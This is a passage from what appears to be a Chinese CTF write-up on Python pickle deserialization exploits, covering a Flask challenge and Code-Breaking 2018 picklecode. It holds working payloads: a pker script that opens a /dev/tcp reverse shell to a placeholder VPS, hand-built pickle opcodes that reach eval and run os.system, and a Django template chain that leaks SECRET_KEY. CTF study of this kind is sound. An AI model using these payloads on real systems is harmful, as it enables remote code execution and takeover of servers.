&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/home&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">Jpg_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Jpg_id&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/images&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">images&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;wget&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getlist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">startswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#d88200">&amp;#39;--&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;image&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#34;-q&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-O&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stdout&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># config.py&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&amp;#34;&lt;/span>
&lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">backdoor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数&lt;code>eval()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 用pker.py生成payload&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;notadmin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;span style="color:#111">door&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;backdoor&amp;#34;&lt;/span>&lt;span style="color:#111">,[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;subprocess&amp;#39;).call(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">echo -e &amp;#39;#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,shell=True)&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后&lt;code>base64.b64encode(data)&lt;/code>加进&lt;code>session['info']&lt;/code>中拿到shell&lt;/p>
&lt;p>看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-&amp;gt;&lt;a href="https://juejin.cn/post/6994717395298287624">wp1&lt;/a> | &lt;a href="https://ctf.njupt.edu.cn/663.html#what_pickle">wp2&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入builtins模块">&amp;ndash;&amp;raquo;仅可以引入&lt;code>builtins&lt;/code>模块&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/9a07ed4bd4c85ec67bcc780dae379984.png" alt="img">&lt;/p>
&lt;p>更多知识参考：&lt;a href="https://blog.51cto.com/xpleaf/1764849">深入理解Python中的&lt;code>__builtin__&lt;/code>和&lt;code>__builtins__&lt;/code>&lt;/a> | [Python 的内建对象](&lt;a href="https://www.jianshu.com/p/645e973">https://www.jianshu.com/p/645e973&lt;/a> 83c1f) | &lt;a href="https://zhuanlan.zhihu.com/p/125693125">&lt;code>__builtins__&lt;/code> 与 &lt;code>__builtin__&lt;/code>（builtins）&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子4 - [Code-Breaking 2018] picklecode
&lt;/h4>
&lt;/summary>
&lt;p>本地复现还是失败，docker地址-&amp;gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了&lt;/p>
&lt;p>审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app&lt;/p>
&lt;p>看core下的settings.py比默认的配置多了54和55行&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152122940.png" alt="image-20210809152122940">&lt;/p>
&lt;p>用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809152317363.png" alt="image-20210809152317363">&lt;/p>
&lt;p>依旧是重写了&lt;code>find_class()&lt;/code>方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809153617320.png" alt="image-20210809153617320">&lt;/p>
&lt;p>模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链&lt;/p>
&lt;p>（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）&lt;code>{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}&lt;/code>，注册一个名为这个的用户即可获得签名的密钥。&lt;/p>
&lt;p>再掉头回去思考opcode的编写。重写&lt;code>find_class()&lt;/code>之后限制很多，但通过builtins仍然可以用&lt;code>getattr()&lt;/code>；那么就分两步走，先通过&lt;code>builtins.getattr('builtins, 'eval')&lt;/code>来获取&lt;code>eval()&lt;/code>，再执行代码。那么如何手写protocol=0的opcode捏？&lt;/p>
&lt;p>首先引入模块builtins和函数getattr&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后需要获取当前的上下文，用globals()&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>globals是个字典，所以还要获取dict这个对象&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>还要执行globals()获取完整上下文&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>栈顶元素是builtins.globals，压入一个空元组&lt;code>(t&lt;/code>，然后用&lt;code>R&lt;/code>执行&lt;/p>
&lt;p>然后用dict.get()方法从globals的字典中拿到键名为builtions的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>反序列化后得到builtins对象&lt;code>&amp;lt;module 'builtins' (built-in)&amp;gt;&lt;/code>；之后再用getattr从builtins对象中取出eval，也就是再套一层娃&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>&amp;lt;built-in function eval&amp;gt;&lt;/code>现在已经拿到了eval对象，再执行代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">getattr&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">dict&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>
&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;ls&amp;#34;)&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809172045469.png" alt="image-20210809172045469">&lt;/p>
&lt;p>成功执行代码（注意运行时不仅需要引入pickle 也要引入builtins才可以！）&lt;/p>
&lt;p>————用pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>参考：&lt;a href="https://www.redmango.top/article/64">wp1&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">Code-Breaking中的两个Python沙箱&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python 格式化字符串漏洞（Django为例）&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--仅可以引入sys模块名字中不带点号">&amp;ndash;&amp;raquo;仅可以引入&lt;code>sys&lt;/code>模块&amp;amp;名字中不带&lt;code>.&lt;/code>点号&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子5 - [BalsnCTF 2019] Pyshv1
&lt;/h4>
&lt;/summary>
&lt;p>题目环境-&amp;gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1&lt;/p>
